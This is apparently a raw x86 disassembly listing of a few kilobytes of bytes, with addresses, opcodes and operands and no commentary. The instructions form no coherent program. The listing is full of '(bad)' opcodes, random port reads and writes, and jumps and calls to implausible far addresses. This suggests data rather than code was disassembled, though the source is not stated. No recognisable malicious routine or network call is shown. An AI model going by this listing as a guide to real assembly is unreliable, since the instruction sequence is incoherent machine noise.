  425b15:	xchg   DWORD PTR [edi-0x55343f93],edx
  425b1b:	xor    dl,BYTE PTR [edx]
  425b1d:	fiadd  DWORD PTR [edi]
  425b1f:	ja     0x425b85
  425b21:	mov    bx,0x8e50
  425b25:	mov    eax,ds:0x6e5ee7ef
  425b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b2b:	out    0x30,al
  425b2d:	ret    
  425b2e:	(bad)  
  425b2f:	jl     0x425b4b
  425b31:	pop    ebx
  425b32:	call   0xc07b95c2
  425b37:	outs   dx,DWORD PTR ds:[esi]
  425b38:	fst    DWORD PTR [ebp+0x45678fbf]
  425b3e:	test   al,0xf8
  425b40:	fptan  
  425b42:	mov    ebx,0x619a4b81
  425b47:	loope  0x425b56
  425b49:	pusha  
  425b4a:	jl     0x425b49
  425b4c:	add    BYTE PTR [eax-0x43],0x91
  425b50:	and    DWORD PTR ds:0x8ba4ce93,ebx
  425b56:	add    BYTE PTR [esi+0x35],ch
  425b59:	and    ch,BYTE PTR [ebp+0x35]
  425b5c:	add    DWORD PTR [edi],0x79142c27
  425b62:	sub    eax,0x12f9b53a
  425b67:	pop    esi
  425b68:	int    0x51
  425b6a:	pop    esi
  425b6b:	sub    eax,DWORD PTR [ecx+0x20]
  425b6e:	fistp  WORD PTR [eax]
  425b70:	(bad)  
  425b71:	sub    BYTE PTR [edi-0x65],cl
  425b74:	pop    ss
  425b75:	xchg   ebp,eax
  425b76:	and    DWORD PTR [esi+0x18f13c04],esi
  425b7c:	outs   dx,BYTE PTR ds:[esi]
  425b7d:	mov    dh,0x98
  425b7f:	pop    ds
  425b80:	dec    ecx
  425b81:	pop    esi
  425b82:	clc    
  425b83:	xchg   esp,eax
  425b84:	in     al,0xe9
  425b86:	adc    al,0xf6
  425b88:	int    0xf6
  425b8a:	dec    ebp
  425b8b:	imul   ebx,DWORD PTR [ebx+ebp*8+0x26d6],0x0
	...
  425bf2:	add    BYTE PTR [eax],al
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	sbb    eax,0xd4681a2f
  425c05:	xchg   edx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	xchg   ebx,eax
  425c0d:	fwait
  425c0e:	cmp    ebx,DWORD PTR [ecx]
  425c10:	mov    BYTE PTR [ebx-0x51f057c0],bl
  425c16:	inc    ebx
  425c17:	push   ds
  425c18:	push   es
  425c19:	jp     0x425c63
  425c1b:	sub    al,0xa1
  425c1d:	pop    esi
  425c1e:	mov    ds:0x824ef96,eax
  425c23:	je     0x425c9a
  425c25:	or     DWORD PTR [ebx-0x791b692f],ebp
  425c2b:	stos   DWORD PTR es:[edi],eax
  425c2c:	add    al,0x53
  425c2e:	and    esp,DWORD PTR [edi-0x2d]
  425c31:	push   0xb956f043
  425c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c37:	and    bh,BYTE PTR [esi-0x1d]
  425c3a:	fcomp  DWORD PTR [esi]
  425c3c:	dec    esi
  425c3d:	pop    eax
  425c3e:	leave  
  425c3f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  425c41:	add    al,BYTE PTR [edi]
  425c43:	sbb    ebx,ebp
  425c45:	ss mov cl,0x8c
  425c48:	js     0x425c5f
  425c4a:	mov    bl,0xc6
  425c4c:	mov    WORD PTR [ebx+0x4f30a50e],cs
  425c52:	jmp    0x425c26
  425c54:	or     eax,0x9031bb6b
  425c59:	pop    ecx
  425c5a:	sahf   
  425c5b:	dec    edi
  425c5c:	adc    al,0xf6
  425c5e:	sar    edi,1
  425c60:	xchg   ebp,eax
  425c61:	lahf   
  425c62:	or     eax,0x16926471
  425c67:	retf   
  425c68:	xor    ebp,DWORD PTR [esi+0x28a0bfee]
  425c6e:	mov    edx,0x7cfc7ff2
  425c73:	fs add al,0x18
  425c76:	ins    DWORD PTR es:[edi],dx
  425c77:	leave  
  425c78:	xlat   BYTE PTR ds:[ebx]
  425c79:	push   ds
  425c7a:	retf   
  425c7b:	cmp    BYTE PTR [edx-0x7f2f1e36],bh
  425c81:	stc    
  425c82:	ret    0xcdbc
  425c85:	ret    0x665f
  425c88:	pop    ebx
  425c89:	jo     0x425c80
  425c8b:	jg     0x425c4b
  425c8d:	inc    edx
  425c8e:	dec    eax
  425c8f:	popa   
  425c90:	popa   
  425c91:	fwait
  425c92:	sbb    edi,DWORD PTR [edi+eiz*4+0x2b9f326]
  425c99:	ins    DWORD PTR es:[edi],dx
  425c9a:	stos   DWORD PTR es:[edi],eax
  425c9b:	in     al,dx
  425c9c:	es sub eax,0x1a75d6f7
  425ca2:	xlat   BYTE PTR ds:[ebx]
  425ca3:	or     eax,0x57b3cc44
  425ca8:	std    
  425ca9:	mov    edx,DWORD PTR [ebp+0x7f]
  425cac:	sub    al,0x7e
  425cae:	or     bh,BYTE PTR [edi+0x78704867]
  425cb4:	adc    dl,ah
  425cb6:	outs   dx,DWORD PTR ds:[esi]
  425cb7:	call   0x177:0xc7aa0bd3
  425cbe:	(bad)  
  425cbf:	daa    
  425cc0:	mov    ah,0xf8
  425cc2:	call   0xad75cbcf
  425cc7:	shl    esi,1
  425cc9:	sub    esp,DWORD PTR [eax]
  425ccb:	pop    ecx
  425ccc:	or     al,0x5c
  425cce:	xor    eax,0xa0679f17
  425cd3:	dec    esi
  425cd4:	lds    edi,FWORD PTR [ebp-0x34cdc3b3]
  425cda:	inc    eax
  425cdb:	les    esi,FWORD PTR [ecx]
  425cdd:	aad    0xf2
  425cdf:	xlat   BYTE PTR ds:[ebx]
  425ce0:	and    ch,ch
  425ce2:	and    DWORD PTR [edi+0x7b],edx
  425ce5:	mov    eax,ds:0x3e6b1937
  425cea:	dec    ebx
  425ceb:	or     BYTE PTR [esi-0x52ec4043],0x3e
  425cf2:	pop    es
  425cf3:	mov    esp,0x2959f690
  425cf8:	sbb    eax,0x524bb91f
  425cfd:	int3   
  425cfe:	or     al,0x4f
  425d00:	fsubr  DWORD PTR [esi+0x2f]
  425d03:	dec    esp
  425d04:	mov    ebx,0x5a4eaf71
  425d09:	push   eax
  425d0a:	test   DWORD PTR [esi+0x38a91ff5],edx
	...
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xe8b4f746,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	sahf   
  425d8d:	mul    BYTE PTR [ecx-0x2b]
  425d90:	mov    al,0xf1
  425d92:	pushf  
  425d93:	fcmove st,st(6)
  425d95:	icebp  
  425d96:	retf   0x2625
  425d99:	cmp    esi,esi
  425d9b:	test   DWORD PTR [ecx],eax
  425d9d:	hlt    
  425d9e:	inc    edx
  425d9f:	mov    eax,ds:0x9ec100d8
  425da4:	ds jbe 0x425d87
  425da7:	test   al,0xef
  425da9:	in     eax,dx
  425daa:	lea    eax,[esi-0x14749280]
  425db0:	xor    eax,0x5a8918d5
  425db5:	bound  edx,QWORD PTR [edx-0x38]
  425db8:	push   0x29688c7f
  425dbd:	mov    esi,0x1909b448
  425dc2:	outs   dx,BYTE PTR ds:[esi]
  425dc3:	push   ebx
  425dc4:	xor    BYTE PTR [ecx-0x1d276088],dl
  425dca:	pop    ss
  425dcb:	xor    BYTE PTR [edi-0xe],ah
  425dce:	sbb    al,0x5e
  425dd0:	xor    ah,ah
  425dd2:	dec    esi
  425dd3:	in     eax,dx
  425dd4:	pop    ecx
  425dd5:	push   edx
  425dd6:	ds cmp al,0xfc
  425dd9:	dec    eax
  425dda:	shr    bh,0xbd
  425ddd:	lahf   
  425dde:	stos   DWORD PTR es:[edi],eax
  425ddf:	pop    esp
  425de0:	dec    edi
  425de1:	inc    cx
  425de3:	rcl    BYTE PTR [ebp+0x4f86a004],cl
  425de9:	call   0x3cee518c
  425dee:	push   edx
  425def:	sub    al,0x5a
  425df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425df2:	push   esp
  425df3:	jmp    0x208b:0xf4312b43
  425dfa:	add    eax,0xeb1cabe1
  425dff:	pop    edi
  425e00:	scas   al,BYTE PTR es:[edi]
  425e01:	push   ebp
  425e02:	sub    ch,bh
  425e04:	mov    edx,0x469770ca
  425e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e0b:	or     al,0x34
  425e0d:	fnstsw WORD PTR ds:0x31d135e2
  425e13:	or     ebp,DWORD PTR [esi-0x243958d7]
  425e19:	ret    
  425e1a:	jo     0x425e22
  425e1c:	cdq    
  425e1d:	sbb    ecx,ebx
  425e1f:	bound  esp,QWORD PTR [ecx+0x6b]
  425e22:	call   0xe8a8:0xae963ac4
  425e29:	fdiv   DWORD PTR ds:0x456f0b17
  425e2f:	hlt    
  425e30:	mov    esi,0xe9e03139
  425e35:	addr16 mov ds:0x38d3,al
  425e39:	(bad)  
  425e3b:	push   esp
  425e3c:	jae    0x425eac
  425e3e:	cwde   
  425e3f:	mov    edx,0x32e521c6
  425e44:	mov    ch,0x80
  425e46:	ja     0x425e67
  425e48:	cld    
  425e49:	sbb    eax,0x3880ead3
  425e4e:	push   edx
  425e4f:	push   esi
  425e50:	sub    DWORD PTR [esp+edi*1+0x4de4278c],esi
  425e57:	mov    bh,0x43
  425e59:	test   BYTE PTR [edi-0x6d],dh
  425e5c:	xchg   DWORD PTR [ebx+0x7d],edx
  425e5f:	sar    DWORD PTR [eax-0xf],0xc9
  425e63:	sub    eax,0x29fea32f
  425e68:	retf   0xd802
  425e6b:	out    dx,al
  425e6c:	pop    esi
  425e6d:	push   edi
  425e6e:	inc    eax
  425e6f:	test   al,0x80
  425e71:	pop    ds
  425e72:	jp     0x425eea
  425e74:	les    eax,FWORD PTR [esi+eax*8]
  425e77:	pop    ecx
  425e78:	outs   dx,BYTE PTR ds:[esi]
  425e79:	and    edx,DWORD PTR [edx]
  425e7b:	sbb    al,0x89
  425e7d:	enter  0xf4dd,0x3d
  425e81:	imul   esi,DWORD PTR [eax+0x3e],0x4364c349
  425e88:	jne    0x425f07
  425e8a:	lock adc edx,ebx
  425e8d:	mov    ecx,0x4c93
	...
  425ef2:	add    BYTE PTR [eax],al
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	gs addr16 push edx
  425f03:	mov    ch,0xdc
  425f05:	xchg   esp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    al,0x1
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	xor    eax,0xef19f2d0
  425f11:	adc    ebx,DWORD PTR [edx-0x16db3cdc]
  425f17:	mov    BYTE PTR [ecx-0x6a],bl
  425f1a:	retf   
  425f1b:	xchg   edi,eax
  425f1c:	int3   
  425f1d:	add    BYTE PTR ds:0xf7751322,0x13
  425f24:	outs   dx,BYTE PTR ds:[esi]
  425f25:	popa   
  425f26:	add    DWORD PTR [ecx+ebx*4-0x44a20b7b],esi
  425f2d:	jecxz  0x425f50
  425f2f:	pop    eax
  425f30:	retf   0xf761
  425f33:	xchg   DWORD PTR [ecx+0x68],ebp
  425f36:	mov    al,ds:0x34e4d3a2
  425f3b:	xchg   esp,eax
  425f3c:	enter  0xe3a,0x44
  425f40:	stc    
  425f41:	sti    
  425f42:	nop
  425f43:	mov    esp,es
  425f45:	mov    bl,0xe4
  425f47:	mov    bl,0x7c
  425f49:	ja     0x425f31
  425f4b:	out    0xca,eax
  425f4d:	(bad)  
  425f4e:	cs out dx,eax
  425f50:	xlat   BYTE PTR ds:[ebx]
  425f51:	push   esp
  425f52:	adc    BYTE PTR [esi+0x30970445],bl
  425f58:	add    al,0xe7
  425f5a:	cmp    al,0x5e
  425f5c:	xor    esi,edx
  425f5e:	xchg   edi,eax
  425f5f:	or     al,0xb3
  425f61:	loopne 0x425fb3
  425f63:	scas   eax,DWORD PTR es:[edi]
  425f64:	mov    esp,0x59ef3214
  425f69:	sub    DWORD PTR [ecx-0x4f],eax
  425f6c:	out    0xbe,eax
  425f6e:	cwde   
  425f6f:	ins    DWORD PTR es:[edi],dx
  425f70:	or     BYTE PTR [ebp+0x8decdb0],0x23
  425f77:	cmp    bl,bl
  425f79:	test   al,0xa6
  425f7b:	or     al,0x45
  425f7d:	sahf   
  425f7e:	femms  
  425f80:	xchg   esp,eax
  425f81:	push   edx
  425f82:	stos   DWORD PTR es:[edi],eax
  425f83:	sbb    ecx,DWORD PTR [bx+0x14af]
  425f88:	jnp    0x425fe7
  425f8a:	inc    ebp
  425f8b:	push   esi
  425f8c:	adc    DWORD PTR [ebp-0x45ae9d17],ecx
  425f92:	in     eax,0x25
  425f94:	xchg   BYTE PTR [eax-0x21],bh
  425f97:	push   esi
  425f98:	test   BYTE PTR [eax+0x36],ch
  425f9b:	mov    al,ds:0x989592bf
  425fa0:	jne    0x425f7e
  425fa2:	addr16 rcl edx,0xf9
  425fa6:	in     eax,0xf0
  425fa8:	rcr    bl,cl
  425faa:	(bad)  [ebx+0x7a]
  425fad:	retf   
  425fae:	iret   
  425faf:	cmp    edi,eax
  425fb1:	mov    ch,0xa6
  425fb3:	out    dx,al
  425fb4:	lds    ebx,FWORD PTR [ebx+ebx*2-0x35]
  425fb8:	popf   
  425fb9:	stos   BYTE PTR es:[edi],al
  425fba:	repnz adc al,0x6b
  425fbd:	fsub   DWORD PTR [esi-0x663ab9a5]
  425fc3:	fs jl  0x425fa4
  425fc6:	push   ds
  425fc7:	aam    0x34
  425fc9:	add    eax,0x73016727
  425fce:	mov    ecx,0xb38cfcb3
  425fd3:	ror    DWORD PTR [ecx],cl
  425fd5:	ret    
  425fd6:	sub    ecx,DWORD PTR ds:0x90f4934e
  425fdc:	pop    DWORD PTR gs:[esi+eax*4+0x4d]
  425fe1:	into   
  425fe2:	mov    ch,0x95
  425fe4:	dec    cl
  425fe6:	popa   
  425fe7:	sbb    dh,dh
  425fe9:	out    dx,eax
  425fea:	xor    dl,BYTE PTR [ebx+0x3e7b16ee]
  425ff0:	xchg   edx,eax
  425ff1:	adc    esp,DWORD PTR [edx]
  425ff3:	xchg   BYTE PTR [ecx-0x60],bl
  425ff6:	sahf   
  425ff7:	sti    
  425ff8:	xchg   ebx,eax
  425ff9:	jecxz  0x426055
  425ffb:	out    0x1c,al
  425ffd:	jge    0x426002
  425fff:	and    dh,BYTE PTR [ecx+0x33]
  426002:	jne    0x425fb0
  426004:	inc    ecx
  426005:	mov    edi,DWORD PTR [ecx-0x1957f6c5]
  42600b:	les    esi,FWORD PTR [eax+0x72]
  42600e:	xor    al,0xec
	...
  426074:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	std    
  426081:	add    ah,bl
  426083:	retf   0x95e0
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	leave  
  42608d:	shr    esi,cl
  42608f:	in     eax,dx
  426090:	dec    di
  426092:	lds    esp,FWORD PTR [eax+0x61]
  426095:	mov    eax,ds:0xc74a1b53
  42609a:	lock add esi,0x5bad0fcf
  4260a1:	lods   eax,DWORD PTR ds:[esi]
  4260a2:	xor    cl,BYTE PTR [eax-0x7bb136e7]
  4260a8:	enter  0x3ab9,0xcb
  4260ac:	loopne 0x426113
  4260ae:	shr    DWORD PTR [ecx-0x74],1
  4260b1:	adc    edx,edx
  4260b3:	dec    ebp
  4260b4:	out    dx,eax
  4260b5:	add    eax,0x205ce44
  4260ba:	ja     0x426096
  4260bc:	and    esi,DWORD PTR [esi+edi*4-0x5af0860e]
  4260c3:	neg    ebp
  4260c5:	hlt    
  4260c6:	adc    ch,0x54
  4260c9:	xchg   esp,eax
  4260ca:	in     eax,dx
  4260cb:	aaa    
  4260cc:	in     al,dx
  4260cd:	push   ecx
  4260ce:	mov    esi,0xae5cd911
  4260d3:	enter  0xb323,0xe5
  4260d7:	dec    eax
  4260d8:	push   ebp
  4260d9:	add    al,0xdf
  4260db:	pop    ss
  4260dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260dd:	sub    DWORD PTR [edi+edx*1-0x65],0xaeac514b
  4260e5:	cld    
  4260e6:	push   ebp
  4260e7:	push   edi
  4260e8:	sbb    eax,0x13049b89
  4260ed:	jle    0x42607c
  4260ef:	dec    esi
  4260f0:	scas   eax,DWORD PTR es:[edi]
  4260f1:	test   ebp,edi
  4260f3:	xchg   DWORD PTR [ecx+0x174aba0e],eax
  4260f9:	push   edx
  4260fa:	lds    ecx,FWORD PTR [ecx-0x12baf876]
  426100:	push   ds
  426101:	inc    edx
  426102:	fdivr  QWORD PTR [edi]
  426104:	push   es
  426105:	adc    ecx,edi
  426107:	mov    ebx,0x5774c62e
  42610c:	mov    ss,WORD PTR [edx]
  42610e:	xchg   esi,eax
  42610f:	mov    dl,0x41
  426111:	xchg   edx,eax
  426112:	fisttp WORD PTR [edx]
  426114:	daa    
  426115:	sub    al,0x90
  426117:	jmp    0x426135
  426119:	adc    eax,0x7bd0f216
  42611e:	mov    edi,0xcdafa626
  426123:	std    
  426124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426125:	jmp    0x4260dc
  426127:	xchg   ebx,eax
  426128:	xchg   esp,eax
  426129:	loop   0x426102
  42612b:	inc    esp
  42612c:	les    esp,FWORD PTR [ecx+0x2b]
  42612f:	ja     0x4260e9
  426131:	xchg   ebp,eax
  426132:	icebp  
  426133:	add    al,0xb6
  426135:	and    edi,ebx
  426137:	pop    ss
  426138:	add    bl,BYTE PTR [eax]
  42613a:	mov    DWORD PTR [esi+edx*8],esp
  42613d:	inc    esi
  42613e:	xor    eax,0xab420f47
  426143:	inc    eax
  426144:	fs inc esp
  426146:	and    cl,BYTE PTR [edi]
  426148:	std    
  426149:	and    BYTE PTR [ebp+0x28],ch
  42614c:	or     eax,0x6febd62d
  426151:	pop    esi
  426152:	sub    esp,edx
  426154:	push   esi
  426155:	int3   
  426156:	popa   
  426157:	inc    edx
  426158:	fwait
  426159:	(bad)  
  42615a:	xlat   BYTE PTR ds:[ebx]
  42615b:	mov    BYTE PTR [eax+0x7b0372a3],cl
  426161:	stos   BYTE PTR es:[edi],al
  426162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426163:	imul   ebp,DWORD PTR [edi],0x19
  426166:	ja     0x4261d5
  426168:	add    eax,0x4de222a6
  42616d:	jl     0x4260fc
  42616f:	sbb    DWORD PTR [esi+0x2764205f],0xc4417ad2
  426179:	or     edx,DWORD PTR [ecx+0xe]
  42617c:	pop    es
  42617d:	fsubr  DWORD PTR [ebx-0x1843f4f6]
  426183:	out    dx,eax
  426184:	sub    al,0xf
  426186:	lods   al,BYTE PTR ds:[esi]
  426187:	pop    ebx
  426188:	das    
  426189:	and    ch,BYTE PTR [edx]
  42618b:	daa    
  42618c:	pusha  
  42618d:	cmp    al,0x25
  42618f:	mov    WORD PTR [eax],es
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	push   0x4f
  426202:	adc    dh,dh
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	fs dec edx
  42620e:	or     BYTE PTR es:[ebx],dh
  426211:	adc    al,0x98
  426213:	retf   
  426214:	adc    BYTE PTR ds:0xa0eef09,al
  42621a:	add    eax,ebx
  42621c:	jecxz  0x42627e
  42621e:	or     DWORD PTR ds:0x455b520,ebx
  426224:	into   
  426225:	comiss xmm2,xmm5
  426228:	mov    ds:0x16983399,al
  42622d:	sbb    ecx,0x79
  426230:	out    dx,eax
  426231:	fwait
  426232:	dec    eax
  426233:	pop    eax
  426234:	pop    eax
  426235:	and    cl,bh
  426237:	jmp    0x426208
  426239:	sbb    al,0x80
  42623b:	ret    
  42623c:	cmp    eax,0x1019e635
  426241:	hlt    
  426242:	(bad)  
  426243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426244:	and    BYTE PTR [edi+eax*2],al
  426247:	fs dec eax
  426249:	mov    edi,DWORD PTR [edi-0x4d]
  42624c:	jmp    0x5b062ec5
  426251:	loope  0x42626c
  426253:	fadd   DWORD PTR [esi+0x5]
  426256:	xchg   DWORD PTR [edx-0x259a4a1],ebp
  42625c:	arpl   ax,bx
  42625e:	pop    es
  42625f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426260:	scas   eax,DWORD PTR es:[edi]
  426261:	jge    0x426245
  426263:	pop    es
  426264:	push   ebp
  426265:	cmp    DWORD PTR [ecx+0x2263b4e7],ebx
  42626b:	aas    
  42626c:	push   cs
  42626d:	and    eax,0xfdaf2f6e
  426272:	jmp    0xd40b:0x4c1bd2a6
  426279:	and    DWORD PTR cs:[eax],esp
  42627c:	jnp    0x42624a
  42627e:	test   eax,0x8c21c1a5
  426283:	pop    ebx
  426284:	outs   dx,BYTE PTR ds:[esi]
  426285:	push   ebx
  426286:	push   ebp
  426287:	sub    eax,0xa2a3c5cf
  42628c:	mov    ecx,ebx
  42628e:	fs mov ch,0xa7
  426291:	push   ecx
  426292:	inc    edx
  426293:	xchg   ebp,eax
  426294:	lahf   
  426295:	ins    DWORD PTR es:[edi],dx
  426296:	outs   dx,DWORD PTR ds:[esi]
  426297:	stos   BYTE PTR es:[edi],al
  426298:	addr16 in al,0x73
  42629b:	xchg   esi,eax
  42629c:	lds    edi,FWORD PTR [edi]
  42629e:	(bad)  
  42629f:	xor    DWORD PTR [ebx],ebx
  4262a1:	sbb    BYTE PTR [esi+0xc],bl
  4262a4:	cs retf 
  4262a6:	push   cs
  4262a7:	int3   
  4262a8:	je     0x4262aa
  4262aa:	push   esp
  4262ab:	out    dx,al
  4262ac:	ins    BYTE PTR es:[edi],dx
  4262ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262ae:	(bad)  [esi+ebp*4]
  4262b1:	inc    edi
  4262b2:	aas    
  4262b3:	inc    ecx
  4262b4:	push   es
  4262b5:	nop
  4262b6:	or     al,0x4f
  4262b8:	dec    ecx
  4262b9:	xor    BYTE PTR ds:0x82555e22,0x1d
  4262c0:	pop    DWORD PTR [edx-0x16]
  4262c3:	and    eax,0x6a4a8f2
  4262c8:	outs   dx,DWORD PTR ds:[esi]
  4262c9:	jp     0x42626e
  4262cb:	les    esi,FWORD PTR [ebp-0x2a53c7cd]
  4262d1:	ss pop ecx
  4262d3:	repz dec esi
  4262d5:	mov    DWORD PTR [edx],ebp
  4262d7:	sbb    eax,0x1930248c
  4262dc:	in     eax,dx
  4262dd:	(bad)  
  4262de:	and    bl,ah
  4262e0:	stos   BYTE PTR es:[edi],al
  4262e1:	aam    0xc3
  4262e3:	sbb    eax,0xcee366c5
  4262e8:	call   0x7e40:0xe53e34b3
  4262ef:	(bad)  
  4262f0:	push   esp
  4262f1:	push   edx
  4262f2:	cs ins DWORD PTR es:[edi],dx
  4262f4:	sub    ecx,ecx
  4262f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262f7:	daa    
  4262f8:	push   ss
  4262f9:	mov    dl,bl
  4262fb:	ja     0x42631a
  4262fd:	dec    ebx
  4262fe:	push   esi
  4262ff:	loop   0x42637b
  426301:	mov    al,ds:0x52c5dcad
  426306:	call   DWORD PTR [eax+0x3d]
  426309:	ret    0xe1ad
  42630c:	retf   0xaaec
  42630f:	push   edx
	...
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xbc893683
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    dh,bh
  42638d:	outs   dx,BYTE PTR ds:[esi]
  42638e:	mov    edx,0xc0cba2e2
  426393:	jno    0x426378
  426395:	fistp  WORD PTR [esi+0x45]
  426398:	leave  
  426399:	aam    0x5d
  42639b:	sub    dx,WORD PTR [eax]
  42639e:	cmp    BYTE PTR [esi-0x1e],dl
  4263a1:	jg     0x426327
  4263a3:	xor    edi,DWORD PTR [eax-0x1bf6830e]
  4263a9:	jmp    0xf6fc:0x25d5a097
  4263b0:	js     0x4263c8
  4263b2:	dec    esi
  4263b3:	fxch   st(7)
  4263b5:	ret    0x4e88
  4263b8:	push   ss
  4263b9:	ds xchg ecx,eax
  4263bb:	repz mov ecx,0xe630cc73
  4263c1:	push   esp
  4263c2:	lds    eax,FWORD PTR [eax+ebx*8+0x4b5a2e59]
  4263c9:	xor    al,0xb2
  4263cb:	aad    0x38
  4263cd:	mov    cl,0xae
  4263cf:	mov    ah,0x15
  4263d1:	aad    0xe0
  4263d3:	std    
  4263d4:	int    0x37
  4263d6:	mov    al,ds:0xd7f00bc6
  4263db:	dec    esp
  4263dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263dd:	hlt    
  4263de:	xor    dh,dh
  4263e0:	xchg   DWORD PTR [ebp-0x22],ebx
  4263e3:	and    al,BYTE PTR [eax-0x44]
  4263e6:	nop
  4263e7:	outs   dx,WORD PTR ds:[esi]
  4263e9:	adc    eax,0x38fdb564
  4263ee:	jecxz  0x42642b
  4263f0:	out    0x34,al
  4263f2:	out    0x20,eax
  4263f4:	ret    
  4263f5:	int3   
  4263f6:	jl     0x42645f
  4263f8:	retf   0x6d8e
  4263fb:	pushf  
  4263fc:	pop    edi
  4263fd:	cli    
  4263fe:	sbb    DWORD PTR [ecx],ecx
  426400:	sub    dl,BYTE PTR [ecx+0x34]
  426403:	and    al,0xc6
  426405:	jne    0x426414
  426407:	push   edi
  426408:	scas   al,BYTE PTR es:[edi]
  426409:	xchg   edx,eax
  42640a:	stos   DWORD PTR es:[edi],eax
  42640b:	popa   
  42640c:	ror    BYTE PTR [esi-0x4c],cl
  42640f:	enter  0x3056,0x2c
  426413:	push   ebp
  426414:	icebp  
  426415:	cmp    ebp,DWORD PTR ds:0x51e0c9dd
  42641b:	push   esp
  42641c:	cmp    al,0xdf
  42641e:	pop    es
  42641f:	(bad)  
  426420:	lock fstp DWORD PTR [edx-0x22]
  426424:	shl    DWORD PTR [ebx],1
  426426:	mov    bh,0x1e
  426428:	push   es
  426429:	shr    BYTE PTR [ecx-0x70fdfb36],0x28
  426430:	inc    edx
  426431:	dec    ecx
  426432:	shl    DWORD PTR [esi+0x65],cl
  426435:	mov    edx,0x23864078
  42643a:	dec    esp
  42643b:	or     ecx,ecx
  42643d:	cmp    DWORD PTR [edi-0x30],esp
  426440:	inc    esp
  426441:	xor    al,0xe6
  426443:	add    esp,edi
  426445:	jecxz  0x426423
  426447:	ins    BYTE PTR es:[edi],dx
  426448:	in     eax,dx
  426449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42644a:	ss mov edx,0xf8981fc7
  426450:	in     eax,0x28
  426452:	(bad)  
  426453:	or     bh,BYTE PTR [ecx+0x16]
  426456:	test   eax,0xb113f838
  42645b:	adc    bl,BYTE PTR [esp+eax*8]
  42645e:	mov    ch,0x72
  426460:	inc    esi
  426461:	or     eax,0xa690e8bc
  426466:	mov    dl,0xd3
  426468:	pop    ss
  426469:	cmp    al,0x5c
  42646b:	push   esi
  42646c:	test   esp,ecx
  42646e:	xchg   edi,eax
  42646f:	pop    es
  426470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426471:	fdiv   DWORD PTR [edx-0x57]
  426474:	push   esi
  426475:	xchg   bl,al
  426477:	xlat   BYTE PTR ds:[bx]
  426479:	push   ecx
  42647a:	out    0xaf,eax
  42647c:	cwde   
  42647d:	push   esi
  42647e:	gs in  al,0x3a
  426481:	pop    ss
  426482:	fidiv  WORD PTR [ecx]
  426484:	mov    dh,0xf6
  426486:	xchg   ebx,eax
  426487:	fnstenv [ebp-0x5e]
  42648a:	mov    bl,0x2a
  42648c:	popa   
  42648d:	clc    
  42648e:	(bad)  
  42648f:	sbb    al,BYTE PTR [eax]
	...
  4264f1:	add    BYTE PTR [eax],al
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   ecx,ecx
  426501:	push   esp
  426502:	push   0x32
  426504:	in     al,dx
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	cmp    ecx,DWORD PTR [ecx-0x4bd01524]
  426512:	cmp    cl,BYTE PTR [edi-0x8]
  426515:	xor    BYTE PTR [eax-0x1f],ah
  426518:	mov    cl,BYTE PTR [ecx]
  42651a:	push   esi
  42651b:	mov    ah,0x57
  42651d:	call   0xf119ed21
  426522:	ja     0x426528
  426524:	ss pop edx
  426526:	mov    ds:0xc8a67064,al
  42652b:	mov    gs,WORD PTR [esi+0x9]
  42652e:	jge    0x4264d2
  426530:	aaa    
  426531:	jmp    0x99c86231
  426536:	into   
  426537:	xchg   edi,eax
  426538:	mov    eax,0xf6311050
